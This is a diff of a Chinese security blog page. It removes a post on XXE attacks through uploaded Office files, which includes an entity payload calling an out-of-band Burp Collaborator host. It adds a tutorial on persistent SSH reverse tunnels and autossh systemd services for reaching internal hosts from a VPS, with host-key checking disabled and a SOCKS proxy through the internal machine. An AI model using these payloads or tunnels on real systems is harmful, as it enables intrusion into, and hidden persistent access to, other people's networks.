@@ -20,25 +20,24 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="0x01-前言XXE via Office Open XML Parsers（复制自 here）许多 Web 应用程序允许您上传 Microsoft Office 文档，然后后端会从中解析数据。例如，您可能有一个 Web 应用程序，允许您通过上传 XLSX 格式的电子表格来导入数据。在某些时候，为了让解析器从电子表格中提取数据，解析器需要parse at least one XML file. 对">
+  <meta name="description" content="ssh反向隧道介绍一种简单的内网穿透方式s 场景示例 设置VPS &#x2F;etc&#x2F;ssh&#x2F;sshd_config，GatewayPorts参数值为yes systemctl restart sshd.service，重启ssh服务  内网电脑简单建立ssh反向隧道。 执行命令：ssh -ngfNTR &lt;VPS监听端口&gt;:&lt;内网主机IP&gt;:&lt;内网">
 <meta property="og:type" content="article">
-<meta property="og:title" content="通过 Office Open XML 解析器进行XXE攻击">
-<meta property="og:url" content="http://example.com/2022/03/18/%E9%80%9A%E8%BF%87-Office-Open-XML-%E8%A7%A3%E6%9E%90%E5%99%A8%E8%BF%9B%E8%A1%8CXXE%E6%94%BB%E5%87%BB/index.html">
+<meta property="og:title" content="内网穿透之ssh反向隧道">
+<meta property="og:url" content="http://example.com/2022/03/19/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E4%B9%8Bssh%E5%8F%8D%E5%90%91%E9%9A%A7%E9%81%93/index.html">
 <meta property="og:site_name" content="singsing&#39;s Blog">
-<meta property="og:description" content="0x01-前言XXE via Office Open XML Parsers（复制自 here）许多 Web 应用程序允许您上传 Microsoft Office 文档，然后后端会从中解析数据。例如，您可能有一个 Web 应用程序，允许您通过上传 XLSX 格式的电子表格来导入数据。在某些时候，为了让解析器从电子表格中提取数据，解析器需要parse at least one XML file. 对">
+<meta property="og:description" content="ssh反向隧道介绍一种简单的内网穿透方式s 场景示例 设置VPS &#x2F;etc&#x2F;ssh&#x2F;sshd_config，GatewayPorts参数值为yes systemctl restart sshd.service，重启ssh服务  内网电脑简单建立ssh反向隧道。 执行命令：ssh -ngfNTR &lt;VPS监听端口&gt;:&lt;内网主机IP&gt;:&lt;内网">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://labs.detectify.com/wp-content/uploads/2021/09/xxe-obscure.png">
-<meta property="og:image" content="https://labs.detectify.com/wp-content/uploads/2021/09/xxe-unzipped.png">
-<meta property="article:published_time" content="2022-03-18T12:48:27.000Z">
-<meta property="article:modified_time" content="2022-03-18T14:12:31.605Z">
+<meta property="og:image" content="https://raw.githubusercontents.com/sing3r/image/main/hexoImage473fb8ec7ad265461809000af8c0d6b3402d6d2d6db7573a4694e7980c08b640.png">
+<meta property="article:published_time" content="2022-03-19T03:03:39.000Z">
+<meta property="article:modified_time" content="2022-03-19T03:15:45.555Z">
 <meta property="article:author" content="singsing">
-<meta property="article:tag" content="WEB安全">
-<meta property="article:tag" content="XXE">
-<meta property="article:tag" content="文件上传">
+<meta property="article:tag" content="内网穿透">
+<meta property="article:tag" content="ssh">
+<meta property="article:tag" content="代理">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://labs.detectify.com/wp-content/uploads/2021/09/xxe-obscure.png">
+<meta name="twitter:image" content="https://raw.githubusercontents.com/sing3r/image/main/hexoImage473fb8ec7ad265461809000af8c0d6b3402d6d2d6db7573a4694e7980c08b640.png">
 
-<link rel="canonical" href="http://example.com/2022/03/18/%E9%80%9A%E8%BF%87-Office-Open-XML-%E8%A7%A3%E6%9E%90%E5%99%A8%E8%BF%9B%E8%A1%8CXXE%E6%94%BB%E5%87%BB/">
+<link rel="canonical" href="http://example.com/2022/03/19/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E4%B9%8Bssh%E5%8F%8D%E5%90%91%E9%9A%A7%E9%81%93/">
 
 
 <script id="page-configurations">
@@ -51,7 +50,7 @@
   };
 </script>
 
-  <title>通过 Office Open XML 解析器进行XXE攻击 | singsing's Blog</title>
+  <title>内网穿透之ssh反向隧道 | singsing's Blog</title>
   
 
 
@@ -199,7 +198,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/18/%E9%80%9A%E8%BF%87-Office-Open-XML-%E8%A7%A3%E6%9E%90%E5%99%A8%E8%BF%9B%E8%A1%8CXXE%E6%94%BB%E5%87%BB/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/19/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E4%B9%8Bssh%E5%8F%8D%E5%90%91%E9%9A%A7%E9%81%93/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -212,7 +211,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          通过 Office Open XML 解析器进行XXE攻击
+          内网穿透之ssh反向隧道
         </h1>
 
         <div class="post-meta">
@@ -223,16 +222,7 @@
               <span class="post-meta-item-text">Posted on</span>
               
 
-              <time title="Created: 2022-03-18 20:48:27 / Modified: 22:12:31" itemprop="dateCreated datePublished" datetime="2022-03-18T20:48:27+08:00">2022-03-18</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
-                </span>
+              <time title="Created: 2022-03-19 11:03:39 / Modified: 11:15:45" itemprop="dateCreated datePublished" datetime="2022-03-19T11:03:39+08:00">2022-03-19</time>
             </span>
 
           
@@ -246,20 +236,42 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01-前言"></a>0x01-前言</h2><h3 id="XXE-via-Office-Open-XML-Parsers"><a href="#XXE-via-Office-Open-XML-Parsers" class="headerlink" title="XXE via Office Open XML Parsers"></a>XXE via Office Open XML Parsers</h3><p>（复制自 <a target="_blank" rel="noopener" href="https://labs.detectify.com/2021/09/30/10-types-web-vulnerabilities-often-missed/"><strong>here</strong></a>）<br>许多 Web 应用程序允许您上传 Microsoft Office 文档，然后后端会从中解析数据。例如，您可能有一个 Web 应用程序，允许您通过上传 XLSX 格式的电子表格来导入数据。在某些时候，为了让解析器从电子表格中提取数据，解析器需要<strong>parse at least one XML file</strong>.</p>
-<p>对此进行测试的唯一方法是生成一个包含 XXE 有效负载的 <strong>Microsoft Office 文件</strong>，所以让我们这样做。<br>首先，创建一个空目录来解压你的文档，然后解压！</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">test$ ls</span><br><span class="line">test.docx</span><br><span class="line">test$ mkdir unzipped</span><br><span class="line">test$ unzip ./test.docx -d ./unzipped/</span><br><span class="line">Archive:  ./test.docx</span><br><span class="line">  inflating: ./unzipped/word/numbering.xml</span><br><span class="line">  inflating: ./unzipped/word/settings.xml</span><br><span class="line">  inflating: ./unzipped/word/fontTable.xml</span><br><span class="line">  inflating: ./unzipped/word/styles.xml</span><br><span class="line">  inflating: ./unzipped/word/document.xml</span><br><span class="line">  inflating: ./unzipped/word/_rels/document.xml.rels</span><br><span class="line">  inflating: ./unzipped/_rels/.rels</span><br><span class="line">  inflating: ./unzipped/word/theme/theme1.xml</span><br><span class="line">  inflating: ./unzipped/[Content_Types].xml</span><br></pre></td></tr></table></figure>
-
-<p>在您喜欢的文本编辑器 (vim) 中打开 <code>./unzipped/word/document.xml</code> 并编辑 <strong>XML 以包含您喜欢的 XXE 有效负载</strong>。我尝试的第一件事往往是 HTTP 请求，如下所示：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE x [ &lt;!ENTITY test SYSTEM &quot;http://[ID].burpcollaborator.net/&quot;&gt; ]&gt;</span><br><span class="line">&lt;x&gt;&amp;test;&lt;/x&gt;</span><br></pre></td></tr></table></figure>
-
-<p>这些行应该像这样插入到两个根 XML 对象之间，当然您需要将 URL 替换为可以监视请求的 URL：</p>
-<p><img src="https://labs.detectify.com/wp-content/uploads/2021/09/xxe-obscure.png" alt="Those lines should be inserted in between the two root XML objects, like thi"></p>
-<p>剩下的就是<strong>压缩文件以创建恶意的 poc.docx 文件</strong>。从我们之前创建的“解压缩”目录中，运行以下命令：</p>
-<p><img src="https://labs.detectify.com/wp-content/uploads/2021/09/xxe-unzipped.png" alt="From the &quot;unzipped&quot; directory that we created earlier, run the following:"></p>
-<p>现在将文件上传到易受攻击的 Web 应用程序，并在 Burp Collaborator 日志监控是否收到请求。</p>
-<h2 id="0x02-通过上传Excel对网站进行XXE攻击"><a href="#0x02-通过上传Excel对网站进行XXE攻击" class="headerlink" title="0x02-通过上传Excel对网站进行XXE攻击"></a>0x02-通过上传Excel对网站进行XXE攻击</h2><h3 id="0x02-1-确认XXE"><a href="#0x02-1-确认XXE" class="headerlink" title="0x02-1 确认XXE"></a>0x02-1 确认XXE</h3><p>某次对项目网站进行测试，发现应用系统中提供多个上传接口，允许用户上传 Excel 文件并在后端对 Excel 文件进行数据解析导入。<br>根据 <code>0x01-前言</code> 提及的方法，对 Excel 解压，修改文件XML内容。第一次修改的文件为 <code>[Content_Types].xml</code> ，修改后重压缩文件为 xsls 文件并上传，测试后现XXE攻击失败。<br>后续将 <code>xl/workbook.xml</code>、<code>xl/worksheets/sheet1.xml</code>、<code>xl/theme/theme1.xml</code>的内容均作修改，插入 XXE PayLoad。重新上传修改后的 xsls 文件，成功触发 XXE漏洞。</p>
-<h3 id="0x02-2-读取文件"><a href="#0x02-2-读取文件" class="headerlink" title="0x02-2 读取文件"></a>0x02-2 读取文件</h3><p>还没来得及测试，对方已修复漏洞，bingo！！！</p>
+        <h1 id="ssh反向隧道"><a href="#ssh反向隧道" class="headerlink" title="ssh反向隧道"></a>ssh反向隧道</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>一种简单的内网穿透方式<br>s</p>
+<h2 id="场景示例"><a href="#场景示例" class="headerlink" title="场景示例"></a>场景示例</h2><p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage473fb8ec7ad265461809000af8c0d6b3402d6d2d6db7573a4694e7980c08b640.png"></p>
+<h2 id="设置"><a href="#设置" class="headerlink" title="设置"></a>设置</h2><h3 id="VPS"><a href="#VPS" class="headerlink" title="VPS"></a>VPS</h3><ol>
+<li>&#x2F;etc&#x2F;ssh&#x2F;sshd_config，GatewayPorts参数值为yes</li>
+<li>systemctl restart sshd.service，重启ssh服务</li>
+</ol>
+<h3 id="内网电脑"><a href="#内网电脑" class="headerlink" title="内网电脑"></a>内网电脑</h3><p><strong>简单建立ssh反向隧道。</strong> 执行命令：<code>ssh -ngfNTR &lt;VPS监听端口&gt;:&lt;内网主机IP&gt;:&lt;内网主机需要转发到VPS的端口&gt; root@&lt;VPS地址&gt; -o ServerAliveInterval=300</code>。例如：<code>ssh -ngfNTR 80:127.0..0.1:22 root@150.158.xx.xx -o ServerAliveInterval=300</code></p>
+<ul>
+<li>-f 表示后台执行</li>
+<li>-N 表示不执行任何命令</li>
+<li>-R 建立反向隧道</li>
+<li>1222 A机用来外面ssh的监听端口</li>
+<li>-o ServerAliveInterval&#x3D;300 的意思是让ssh client每300秒就给server发个心跳,以免链路被RST. </li>
+<li>-f Requests ssh to go to background just before command execution. 让该命令后台运行 . </li>
+<li>-n Redirects stdin from &#x2F;dev&#x2F;null (actually, prevents reading from stdin). </li>
+<li>-N Do not execute a remote command. 不执行远程命令 . </li>
+<li>-T Disable pseudo-tty allocation. 不占用 shell . </li>
+<li>-g Allows remote hosts to connect to local forwarded ports.</li>
+</ul>
+<p><strong>持久建立ssh反向隧道-1。</strong> </p>
+<ol>
+<li>安装autossh；</li>
+<li>新建<code>/opt/sshPortMapping.sh</code>，赋予644权限，内容为:<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">autossh -M 7890 -NR 80:127.0.0.1:22 root@150.158.84.84 -i ~/.ssh/id_rsa</span><br></pre></td></tr></table></figure></li>
+<li>新建开机自启动服务文件 <code>/usr/lib/systemd/system/autosshd.service</code>：<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=Auto SSH Tunnel</span><br><span class="line">After=network-online.target</span><br><span class="line">StartLimitInterval=10</span><br><span class="line">[Service]</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">User=root</span></span><br><span class="line">Type=simple</span><br><span class="line">ExecStart=/bin/bash /opt/sshPortMapping.sh</span><br><span class="line">ExecReload=/bin/kill -HUP $MAINPID</span><br><span class="line">KillMode=process</span><br><span class="line">Restart=always</span><br><span class="line">RestartSec=5</span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">WantedBy=graphical.target</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">WantedBy=default.target</span></span><br></pre></td></tr></table></figure></li>
+<li>设置为开机自启动服务：<code>systemctl enable autosshd.service</code></li>
+<li>启动服务：<code>systemctl start autosshd </code></li>
+</ol>
+<blockquote>
+<p><strong>PS：</strong> 因为autossh需要交互输入vps的密码，存在不便。所以使用证书登陆，autossh通过-i指定证书文件进行免密登陆，所以“持久建立ssh反向隧道”还需要在内网主机生成证书，并将公钥上传vps。<br>   6. 至此，其他机器就可以<code>ssh root@150.158.84.84 -p 80</code>访问内网主机。 </p>
+</blockquote>
+<p><strong>持久建立ssh反向隧道-2</strong></p>
+<p>将<code>/opt/sshPortMapping.sh</code>代码替换为以下，其余同“持久建立ssh反向隧道-1”操作一样：<br><code>autossh -M 7890 -fN -o &quot;PubkeyAuthentication=yes&quot; -o &quot;StrictHostKeyChecking=false&quot; -o &quot;PasswordAuthentication=no&quot; -o &quot;ServerAliveInterval 60&quot; -o &quot;ServerAliveCountMax 3&quot; -R 80:127.0.0.1:22 root@150.158.84.84 -i ~/.ssh/id_rsa</code></p>
+<h2 id="基于ssh反向隧道建立socket代理"><a href="#基于ssh反向隧道建立socket代理" class="headerlink" title="基于ssh反向隧道建立socket代理"></a>基于ssh反向隧道建立socket代理</h2><p>通过上面的设置已经可以访问内网主机的ssh端口，基于以上，在其他client主机上执行以下命令：<code>ssh -N -D 127.0.0.1:9999 root@150.158.xx.xx -p 80</code>。接下来就可以将浏览器浏代理设置为<code>socket//127.0.0.1:9999</code>，将内网主机将作为代理服务器。</p>
+<h2 id="踩坑"><a href="#踩坑" class="headerlink" title="踩坑"></a>踩坑</h2><ol>
+<li>测试中，非root用户无法无法建立转发，原因未明。</li>
+</ol>
 
     </div>
 
@@ -269,9 +281,9 @@
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/WEB%E5%AE%89%E5%85%A8/" rel="tag"># WEB安全</a>
-              <a href="/tags/XXE/" rel="tag"># XXE</a>
-              <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag"># 文件上传</a>
+              <a href="/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/" rel="tag"># 内网穿透</a>
+              <a href="/tags/ssh/" rel="tag"># ssh</a>
+              <a href="/tags/%E4%BB%A3%E7%90%86/" rel="tag"># 代理</a>
           </div>
 
         
@@ -280,13 +292,10 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2022/03/18/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E4%B9%8B%E5%89%8D%E7%AB%AFAES%E5%8A%A0%E5%AF%86/" rel="prev" title="暴力破解之前端AES加密">
-      <i class="fa fa-chevron-left"></i> 暴力破解之前端AES加密
+    <a href="/2022/03/18/%E9%80%9A%E8%BF%87-Office-Open-XML-%E8%A7%A3%E6%9E%90%E5%99%A8%E8%BF%9B%E8%A1%8CXXE%E6%94%BB%E5%87%BB/" rel="prev" title="通过 Office Open XML 解析器进行XXE攻击">
+      <i class="fa fa-chevron-left"></i> 通过 Office Open XML 解析器进行XXE攻击
     </a></div>
-      <div class="post-nav-item">
-    <a href="/2022/03/19/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E4%B9%8Bssh%E5%8F%8D%E5%90%91%E9%9A%A7%E9%81%93/" rel="next" title="内网穿透之ssh反向隧道">
-      内网穿透之ssh反向隧道 <i class="fa fa-chevron-right"></i>
-    </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
@@ -346,7 +355,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">0x01-前言</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#XXE-via-Office-Open-XML-Parsers"><span class="nav-number">1.1.</span> <span class="nav-text">XXE via Office Open XML Parsers</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E9%80%9A%E8%BF%87%E4%B8%8A%E4%BC%A0Excel%E5%AF%B9%E7%BD%91%E7%AB%99%E8%BF%9B%E8%A1%8CXXE%E6%94%BB%E5%87%BB"><span class="nav-number">2.</span> <span class="nav-text">0x02-通过上传Excel对网站进行XXE攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-1-%E7%A1%AE%E8%AE%A4XXE"><span class="nav-number">2.1.</span> <span class="nav-text">0x02-1 确认XXE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-2-%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="nav-number">2.2.</span> <span class="nav-text">0x02-2 读取文件</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ssh%E5%8F%8D%E5%90%91%E9%9A%A7%E9%81%93"><span class="nav-number">1.</span> <span class="nav-text">ssh反向隧道</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%8B%E7%BB%8D"><span class="nav-number">1.1.</span> <span class="nav-text">介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9C%BA%E6%99%AF%E7%A4%BA%E4%BE%8B"><span class="nav-number">1.2.</span> <span class="nav-text">场景示例</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AE%BE%E7%BD%AE"><span class="nav-number">1.3.</span> <span class="nav-text">设置</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#VPS"><span class="nav-number">1.3.1.</span> <span class="nav-text">VPS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E7%94%B5%E8%84%91"><span class="nav-number">1.3.2.</span> <span class="nav-text">内网电脑</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8Essh%E5%8F%8D%E5%90%91%E9%9A%A7%E9%81%93%E5%BB%BA%E7%AB%8Bsocket%E4%BB%A3%E7%90%86"><span class="nav-number">1.4.</span> <span class="nav-text">基于ssh反向隧道建立socket代理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B8%A9%E5%9D%91"><span class="nav-number">1.5.</span> <span class="nav-text">踩坑</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -472,7 +481,7 @@ NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
       repo        : 'sing3r.github.io',
       owner       : 'sing3r',
       admin       : ['sing3r'],
-      id          : 'f35bcff8ecde30ab53ae861ace558a22',
+      id          : '6b5a6f67439a300d7dc8e57a06439707',
         language: '',
       distractionFreeMode: true
     });
